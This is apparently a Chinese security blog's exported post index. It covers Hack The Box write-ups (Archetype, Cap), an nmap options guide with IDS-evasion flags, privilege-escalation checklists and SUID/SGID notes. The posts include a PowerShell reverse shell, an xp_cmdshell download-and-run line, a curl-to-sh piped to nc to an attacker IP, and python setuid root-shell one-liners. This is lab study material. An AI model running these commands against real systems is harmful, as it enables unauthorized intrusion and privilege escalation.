class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) -ne <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-keyword">New</span>-<span class="hljs-keyword">Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | Out-<span class="hljs-keyword">String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close() </span></code></pre></div></div><ol start="4"><li>目标机上如何下载并运行<code>shell.ps1</code>文件</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line">xp_cmdshell &quot;powershell &quot;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.14.32:1633/shell.ps1\&quot;);&quot;&quot;</span></code></pre></div></div><p>这样就可以获得shell了。 那么还有没有其他的方法呢？ 后面讨论</p><h2 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h2><p>在本案例中，权限提升是通过找到目标机上的历史记录得到Administrator用户的。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-powershell codeBlockLines"><span class="line"><span class="hljs-built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span></code></pre></div></div><p><img src="/2021/07/27/HTB-start-point-1-archetype/1611890465860.png"></p><p><code>net use</code> 是将远端smb映射到本地上，并且通常会使用用户。</p><p>得到用户密码之后就是登录的操作了。</p><p>使用的工具是<code>psexec</code></p><p><code>psexec administrator@10.10.10.27</code></p><p>flag 就在桌面目录上</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>get shell 的工具：</p><ol><li>MSF <code>exploit/windows/smb/psexec</code><ul><li>使用<a href="https://github.com/trustedsec/unicorn">unicorn</a>可以生成生成对应的shellcode</li></ul></li><li>psexec</li><li>Winexe</li><li>smbexec.py</li><li>wmiexec.py</li><li>CrackMapExec</li><li></li></ol><ul><li><a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">参考文章</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linpeas 使用</title>
      <link href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>linpeas是用shell脚本编写的本地提权检查清单，<a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">github</a></p><p>使用命令已收录至<a href="https://github.com/Elinpf/cmder">cmder</a></p><p><img src="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap 使用</title>
      <link href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h2><ol><li><code>-sn</code> 只判断主机是否在线，不扫描端口</li><li><code>-sV</code> 判断服务软件版本</li><li><code>-O</code> 判断操作系统</li><li><code>-Pn</code> 当主机禁ping后使用，否则会被跳过</li><li><code>-A</code> 强力检测，包含以下：</li></ol><p>服务版本识别（-sV）<br>操作系统识别（-O）<br>脚本扫描（-sC）<br>Traceroute（–traceroute）</p><h2 id="TCP扫描选项"><a href="#TCP扫描选项" class="headerlink" title="TCP扫描选项"></a>TCP扫描选项</h2><ol><li><p>TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行<strong>完整的三次握手</strong>。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三 次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来。如果启动 Nmap的用户的权限不足，那么默认情况下Nmap程序将以这种模式进行扫描。</p></li><li><p>​SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将<strong>使用含有SYN标志位</strong>的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常好。而且由于这种模式不会进行三次握手，所以<strong>是一种十分隐蔽的扫描方式。如果启动Nmap的用户有高级别权限，那么在默认情况下Nmap程序将以这种模式进行扫描。</strong></p></li><li><p>TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位；FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</p></li><li><p>TCP Maimon扫描（-sM）：Uriel Maimon 首先发现了TCP Maimom扫描方式。这种模式的探测数据包含有FIN/ACK标识。对于BSD衍生出来的各种操作系统来说，如果被测端口处于 开放状态，主机将会丢弃这种探测数据包；如果被测端口处于关闭状态，那么主机将会回复 RST。</p></li><li><p>TCPACK扫描（-sA）：这种扫描模式可以<strong>检测目标系统是否采用了数据包状态监测技术（stateful）防火墙</strong>，并能确定哪些端口被防火墙屏蔽。这种类型的数据包只有一个ACK标识位。如果目标主机的回复中含有RST标识，则说明目标主机没有被过滤。</p></li><li><p>TCP窗口扫描（-sW）：这种扫描方式检测目标返回的RST数据包的TCP窗口字段。如果目标端口处于开放状态，这个字段的值将是正值；否则它的值应当是0。</p></li><li><p>TCP Idle扫描（-sI）：采用这种技术后，您将通过指定的僵尸主机发送扫描数据包。本机并不与目标主机直接通信。如果对方网络里有IDS，IDS将认为发起扫描的主机是僵尸主机。</p></li></ol><h2 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h2><p>UDP扫描只有一个<code>-sU</code>选项，由于Linux内核只能进行1秒1次的UDP报文发送，所以必须有针对性的优化扫描</p><ol><li>对常见端口进行扫描</li><li>并行扫描</li><li>在防火墙后方扫描</li><li>使用–host-timeout跳过超时主机</li></ol><h2 id="端口目标选项"><a href="#端口目标选项" class="headerlink" title="端口目标选项"></a>端口目标选项</h2><ul><li><code>-p</code> 指定端口</li><li><code>-F</code> 快速扫描，仅扫描常用的100个端口</li><li><code>-r</code> 顺序扫描，不随机</li><li><code>--top-ports</code> 扫描排名前N的端口</li><li><code>--port-ratio</code> 扫描前百分比的端口</li></ul><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><ul><li>sV 打开版本探测</li><li><code>--version-intensity &lt;intensity&gt;</code> 设置版本扫描强度, 设置强度的值在 0~9之间，默认是7</li></ul><h2 id="输出选项"><a href="#输出选项" class="headerlink" title="输出选项"></a>输出选项</h2><ol><li>-oN Normal，不显示runtime和警告信息</li><li>-oX xml</li><li>-oG gnmap，方便Grep</li><li>-oA 以上三种一起输出</li></ol><h2 id="时间排程控制"><a href="#时间排程控制" class="headerlink" title="时间排程控制"></a>时间排程控制</h2><p>-T 有6个等级</p><p>paranoid（0）：每5分钟发送一次数据包，且不会以并行方式同时发送多组数据。这种模式的扫描不会被IDS检测到。</p><p>sneaky（1）：每隔15秒发送一个数据包，且不会以并行方式同时发送多组数据。</p><p>polite（2）：每0.4秒发送一个数据包，且不会以并行方式同时发送多组数据。</p><p>normal（3）：此模式同时向多个目标发送多个数据包，为    Nmap默认的模式，该模式能自动在扫描时间和网络负载之间进行平衡。</p><p>aggressive（4）：在这种模式下，Nmap    对每个既定的主机只扫描5分钟，然后扫描下一台主机。它等待响应的时间不超过1.25秒。</p><p>insane（5）：在这种模式下，Nmap对每个既定的主机仅扫描74秒，然后扫描下一台主机。它等待响应的时间不超过0.3秒。</p><h2 id="脚本引擎"><a href="#脚本引擎" class="headerlink" title="脚本引擎"></a>脚本引擎</h2><p>NSE(Nmap Script Engine)可以扩展nmap的使用范围，并且用户可以自定义自己的脚本实现针对性的扫描</p><p>-sC 或–script=default：启动默认类NSE脚本。</p><p>在Kali Linux系统中，Nmap脚本位于目录/usr/share/nmap/scripts。</p><p><code>--script &lt;filename&gt;|&lt;category&gt;|&lt;directories&gt;</code>：根据指定的文件名、类别名、目录名，执行相应的脚本。</p><p><code>--script-args &lt;args&gt;</code> ：这个选项用于给脚本指定参数。例如，在使用认证类脚本时，可通过这个选项指定用户名和密码</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">auth</td><td align="center">此类脚本使用暴力破解等技术找出目标系统上的认证信息。</td></tr><tr><td align="center">default</td><td align="center">启用–sC 或者-A 选项时运行此类脚本。这类脚本同时具有: 执行速度快；输出的信息有指导下一步操作的价值；输出信息内容丰富、形式简洁；必须可靠；不会侵入目标系统；能泄露信息给第三方。</td></tr><tr><td align="center">discovery</td><td align="center">该类脚本用于探索网络。</td></tr><tr><td align="center">dos</td><td align="center">该类脚本可能使目标系统拒绝服务，请谨慎使用。</td></tr><tr><td align="center">exploit</td><td align="center">该类脚本利用目标系统的安全漏洞。在运行这类脚本之前，渗透测试人员需要获取 被测单位的行动许可。</td></tr><tr><td align="center">external</td><td align="center">该类脚本可能泄露信息给第三方。</td></tr><tr><td align="center">fuzzer</td><td align="center">该类脚本用于对目标系统进行模糊测试。</td></tr><tr><td align="center">instrusive</td><td align="center">该类脚本可能导致目标系统崩溃，或耗尽目标系统的所有资源。</td></tr><tr><td align="center">malware</td><td align="center">该类脚本检査目标系统上是否存在恶意软件或后门。</td></tr><tr><td align="center">safe</td><td align="center">该类脚本不会导致目标服务崩溃、拒绝服务且不利用漏洞。</td></tr><tr><td align="center">version</td><td align="center">配合版本检测选项（-sV），这类脚本对目标系统的服务程序进行深入的版本检 测。</td></tr><tr><td align="center">vuln</td><td align="center">该类脚本可检测检査目标系统上的安全漏洞。</td></tr></tbody></table><ul><li>–script-help 打印帮助</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap --script-help <span class="hljs-string">&quot;(vuln) and *smb*&quot;</span></span></code></pre></div></div><h2 id="规避检测选项"><a href="#规避检测选项" class="headerlink" title="规避检测选项"></a>规避检测选项</h2><p>真实环境中探测目标往往都在IDS之后，所以有必要针对网络环境选择规避检测的选项</p><p>-f（使用小数据包）：这个选项可避免对方识别出我们探测的数据包。指定这个选项之后， Nmap将使用8字节甚至更小数据体的数据包。</p><p>–mtu：这个选项用来调整数据包的包大小。MTU（Maximum    Transmission Unit，最大传输单元）必须是8的整数倍，否则Nmap将报错。</p><p>-D（诱饵）：这个选项应指定假    IP，即诱饵的IP。启用这个选项之后，Nmap    在发送侦测 数据包的时候会掺杂一些源地址是假IP（诱饵）的数据包。这种功能意在以藏木于林的方法 掩盖本机的真实    IP。也就是说，对方的log还会记录下本机的真实IP。您可使用RND生成随机 的假IP地址，或者用RND：number的参数生成N个假IP地址。您所指定的诱饵主机 应当在线，否则很容易击溃目标主机。另外，使用了过多的诱饵可能造成网络拥堵。尤其是在扫描客户的网络的时候，您应当极力避免上述情况。</p><p><code>--source-port &lt;portnumber&gt;</code>或-g（模拟源端口）：如果防火墙只允许某些源端口的入站流量，这个选项就非常有用。</p><p>–data-length：这个选项用于改变Nmap    发送数据包的默认数据长度，以避免被识别出来是Nmap的扫描数据。</p><p>–max-parallelism：这个选项可限制Nmap并发扫描的最大连接数。</p><p><code>--scan-delay &lt;time&gt;</code>：这个选项用于控制发送探测数据的时间间隔，以避免达到IDS/IPS端 口扫描规则的阈值。</p><h2 id="常用命令构造"><a href="#常用命令构造" class="headerlink" title="常用命令构造"></a>常用命令构造</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h4 id="常见端口扫描"><a href="#常见端口扫描" class="headerlink" title="常见端口扫描"></a>常见端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="HTTP端口扫描"><a href="#HTTP端口扫描" class="headerlink" title="HTTP端口扫描"></a>HTTP端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -p80,443,8000-8100,8443 -T4 <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><h4 id="数据库中top1000端口扫描"><a href="#数据库中top1000端口扫描" class="headerlink" title="数据库中top1000端口扫描"></a>数据库中top1000端口扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -sC -O -T4 -n -Pn -oA fastscan <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div><p>使用版本扫描(-sV),使用default脚本(-sC),开启系统版本检测(-O),扫描强度4级(-T4),不递归DNS(-n),不检测主机是否ping通(-Pn),全文件类型输出(-oA)</p><h4 id="将检测到打开的端口放在环境变量中"><a href="#将检测到打开的端口放在环境变量中" class="headerlink" title="将检测到打开的端口放在环境变量中"></a>将检测到打开的端口放在环境变量中</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 <span class="hljs-comment">#&#123;RHOST&#125; | grep ^[0-9] | cut -d &#x27;/&#x27; -f 1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//)</span></span></code></pre></div></div><h3 id="脚本使用"><a href="#脚本使用" class="headerlink" title="脚本使用"></a>脚本使用</h3><h4 id="查找脚本并打印使用说明"><a href="#查找脚本并打印使用说明" class="headerlink" title="查找脚本并打印使用说明"></a>查找脚本并打印使用说明</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-comment"># 搜索default version safe 类型的模块</span></span><span class="line">locate -r <span class="hljs-string">&#x27;\.nse$&#x27;</span> | xargs grep categories | grep <span class="hljs-string">&#x27;default\|version\|safe&#x27;</span> | grep <span class="hljs-comment">#&#123;module&#125;</span></span><span class="line"></br></span><span class="line"><span class="hljs-comment"># 打印说明</span></span><span class="line">nmap --script-help <span class="hljs-string">&quot;(default or version) and *#&#123;module&#125;*&quot;</span></span></code></pre></div></div><h4 id="使用漏洞扫描"><a href="#使用漏洞扫描" class="headerlink" title="使用漏洞扫描"></a>使用漏洞扫描</h4><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nmap -sV -O -p --script vuln <span class="hljs-comment">#&#123;RHOST&#125;</span></span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 侦察清单</title>
      <link href="/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/26/Linux-%E4%BE%A6%E5%AF%9F%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<h2 id="在确定系统后的初步侦察清单"><a href="#在确定系统后的初步侦察清单" class="headerlink" title="在确定系统后的初步侦察清单"></a>在确定系统后的初步侦察清单</h2><p>检查开放端口，系统版本，服务版本，漏洞信息</p><p><a href="/2021/07/26/nmap-%E4%BD%BF%E7%94%A8/" title="nmap 使用">nmap 使用</a></p><ul><li><input disabled="" type="checkbox"> 端口的初步扫描</li><li><input disabled="" type="checkbox"> 端口的全面扫描</li><li><input disabled="" type="checkbox"> 带漏扫脚本的端口定向扫描</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 侦察 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 可执行文件的漏洞利用</title>
      <link href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>当可执行文件被配置为SUID或者放在SUDO中的时候，这就意味着文件可以以高权限运行，那么只要找出漏洞就可以提权。</p><p><a href="/2021/07/21/SUID-SGID/" title="Linux SUID &amp; SGID">Linux SUID &amp; SGID</a></p><ul><li><input disabled="" type="checkbox"> 脚本用的是csh?</li><li><input disabled="" type="checkbox"> 引用的文件没有使用绝对路径？</li><li><input disabled="" type="checkbox"> 脚本的适用范围是否过大？</li><li><input disabled="" type="checkbox"> 使用了临时文件？</li><li><input disabled="" type="checkbox"> 参数是否过滤，能否用分号做更多的事</li><li><input disabled="" type="checkbox"> 是否设置了IFS</li><li><input disabled="" type="checkbox"> 脚本本身的风险</li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 提权清单</title>
      <link href="/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/"/>
      <url>/2021/07/23/linux-%E6%8F%90%E6%9D%83%E6%B8%85%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>本篇为总结Linux的提权方法，并做成清单列表已供查询提示。</p><p>大部分清单内容已经在<code>LinPEAS</code>中包含了，如何使用请查看<a href="/2021/07/27/linpeas-%E4%BD%BF%E7%94%A8/" title="linpeas 使用">linpeas 使用</a></p><h2 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h2><ul><li><input disabled="" type="checkbox"> 系统信息</li></ul><h2 id="权限检查"><a href="#权限检查" class="headerlink" title="权限检查"></a>权限检查</h2><ul><li><input disabled="" type="checkbox"> <code>sudo -l</code></li><li><input disabled="" type="checkbox"> <code>suid</code> 和 <code>sgid</code> (<a href="/2021/07/21/SUID-SGID/" title="查看">查看</a>)</li><li><input disabled="" type="checkbox"> <a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></li><li><input disabled="" type="checkbox"> <a href="/2021/07/23/linux-%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B8%85%E5%8D%95/" title="可执行文件的漏洞">可执行文件的漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> checklist </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB cap</title>
      <link href="/2021/07/22/HTB-cap/"/>
      <url>/2021/07/22/HTB-cap/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th align="center">IP</th><th align="center">ROLE</th><th align="center">OS</th></tr></thead><tbody><tr><td align="center">10.10.10.245</td><td align="center">Victim</td><td align="center">Linux</td></tr><tr><td align="center">10.10.14.228</td><td align="center">Attacker</td><td align="center">Kali</td></tr></tbody></table><blockquote><p>如果你是在找writeup而看的这篇文章，那么请再坚持一下。这里给一点提示:</p><ol><li>仔细观察表面内容，这题并没有需要深挖的内容，别想多</li><li>root的方法题目已经给出来了</li></ol></blockquote><h2 id="获取普通权限"><a href="#获取普通权限" class="headerlink" title="获取普通权限"></a>获取普通权限</h2><p>通过nmap检查端口，发现有<code>21 22 80</code>端口打开，再没有其他端口。</p><p>第一反应是ftp的匿名用户或者常用用户。尝试爆破，这里推荐<a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt">这个字典</a></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">hydra -C password.txt -u -e s 10.10.10.245 ftp</span></code></pre></div></div><p>ftp这里其实是个幌子，使用常用密码爆破没有作用。</p><p>然后打开80网页，通过观察，发现<code>10.10.10.245/data/3</code>这个页面是的数字是变动的，更改为<code>0</code>后获取pcap文件。</p><p>用<code>Wireshark</code>打开后过观察报文发现有FTP报文，追踪TCP流的到FTP用户密码</p><p><img src="/2021/07/22/HTB-cap/1.png"></p><p>ssh 登录</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-nginx codeBlockLines"><span class="line"><span class="hljs-attribute">ssh</span> nathan@<span class="hljs-number">10.10.10.245</span></span></code></pre></div></div><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权起手式</p><ul><li>查看<code>sudo -l</code> </li><li>利用<code>LinPEAS</code>搜索</li></ul><p>当查看<code>sudo -l</code>的时候，此用户没有任何内容</p><h3 id="使用-LinPEAS"><a href="#使用-LinPEAS" class="headerlink" title="使用 LinPEAS"></a>使用 <code>LinPEAS</code></h3><p>使用不写入硬盘的方式利用<code>LinPEAS</code>，这里用到<a href="https://github.com/Elinpf/cmder">cmder</a>工具提示命令。</p><p>下载LinPEAS</p><p><img src="/2021/07/22/HTB-cap/2.png"></p><p>监听端口并发送LinPEAS</p><p><img src="/2021/07/22/HTB-cap/3.png"></p><p><img src="/2021/07/22/HTB-cap/4.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python3 -m http.server 5711 &amp;</span><span class="line">nc -lvnp 1633 | tee linpeas.out</span></code></pre></div></div><p>用cmder得到命令后，到目标机上执行</p><p><img src="/2021/07/22/HTB-cap/5.png"></p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">curl 10.10.14.228:5711/linpeas.sh | sh | nc 10.10.14.228 1633</span></code></pre></div></div><p>这样就可以不留痕迹的得到输出文件了</p><h2 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h2><p>观察输出文件发现</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">╔══════════╣ Capabilities</span><span class="line">╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities</span><span class="line">Current capabilities:</span><span class="line">Current: =</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Shell capabilities:</span><span class="line">0x0000000000000000=</span><span class="line">CapInh: 0000000000000000</span><span class="line">CapPrm: 0000000000000000</span><span class="line">CapEff: 0000000000000000</span><span class="line">CapBnd: 0000003fffffffff</span><span class="line">CapAmb: 0000000000000000</span><span class="line"></br></span><span class="line">Files with capabilities (limited to 50):</span><span class="line marked">/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</span><span class="line">/usr/bin/ping = cap_net_raw+ep</span><span class="line">/usr/bin/traceroute6.iputils = cap_net_raw+ep</span><span class="line">/usr/bin/mtr-packet = cap_net_raw+ep</span><span class="line">/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep</span></code></pre></div></div><p>了解到<code>python3.8</code>拥有<code>cap_setuid</code>的能力。 关于Capabilities请查看<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a></p><p><code>cap_setuid</code>可以设置有效用户，能够提权。</p><p>因为是python，所以利用方法为</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">/usr/bin/python3.8 -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><p>得到root权限</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本题简单，但是也有知识点，需要对<a href="/2021/07/21/linux-capabilities/" title="Linux Capabilities">Linux Capabilities</a>有所了解。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux SUID &amp; SGID</title>
      <link href="/2021/07/21/SUID-SGID/"/>
      <url>/2021/07/21/SUID-SGID/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>SUID 就是 Set User id， SGID 就是 Set Group id</p><h3 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">nathan@<span class="hljs-built_in">cap</span>:~<span class="hljs-comment"># ls -la /usr/bin/passwd</span></span><span class="line">-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd</span></code></pre></div></div><p>可以看到<code>s</code>这个标签在原本的<code>x</code>标签上，特点如下：</p><ol><li>SUID权限仅对可执行文件有效</li><li>如果执行者对这个文件有执行权限，那么将以文件的所有者权限执行</li><li>本权限仅在运行的过程中有效</li></ol><p>那么现在再看下passwd的执行过程。因为nathan拥有可执行权限，而passwd在所有者的权限是<code>wrs</code>，所以当nathan用户运行的时候是以root的权限执行的，进行修改了<code>/etc/shadow</code>。</p><p>修改成SUID的命令为</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 4755 /usr/bin/cat</span><span class="line">chmod u+s /usr/bin/cat</span></code></pre></div></div><h3 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h3><p>对于可执行文件特点与SUID一样，只不过是以组的权限运行的。</p><p>对于文件夹来说，如果这个文件夹的所有组被标记了<code>s</code>，特点如下：</p><ol><li>对这个文件夹拥有<code>r</code>和<code>x</code>的用户，可以进入文件夹</li><li>进入文件夹后，用户的操作为文件夹用户组的操作权限</li><li>如果用户拥有<code>w</code>的权限，那么用户创建文件的用户组就是这个文件夹组的用户组</li></ol><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">chmod 2755 file_dir</span><span class="line">chmod g+s file_dir</span></code></pre></div></div><h3 id="rwS"><a href="#rwS" class="headerlink" title="rwS"></a>rwS</h3><p>有的文件是<code>S</code>为标记，说明没有执行权限。因为与<code>x</code>重合了所有做了区分</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>suid 的利用方式常常是因为配置的可执行文件能够得到<code>shell</code>或者可以访问敏感信息。</p><p>例如，如果<code>cat</code>有了suid的权限，那么就可以访问<code>cat /etc/shadow</code>。</p><p>或者<code>python</code>有了suid，那么就可以以root权限执行<code>/bin/bash</code>从而得到root的shell</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">python -c <span class="hljs-string">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></span></code></pre></div></div><h3 id="查找方法"><a href="#查找方法" class="headerlink" title="查找方法"></a>查找方法</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line">find / -perm -4000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有suid的二进制文件</span></span><span class="line">find / -perm -2000 2&gt;/dev/null  <span class="hljs-comment"># 查看所有sgid的二进制文件和文件夹</span></span></code></pre></div></div><h3 id="7种利用方法"><a href="#7种利用方法" class="headerlink" title="7种利用方法"></a>7种利用方法</h3><p>方法参考了<a href="http://repository.root-me.org/Administration/Unix/EN%20-%20Dangers%20of%20SUID%20Shell%20Scripts.pdf">这篇文章</a></p><h4 id="用的是csh"><a href="#用的是csh" class="headerlink" title="用的是csh?"></a>用的是csh?</h4><div class="codeBlockContainer"><div 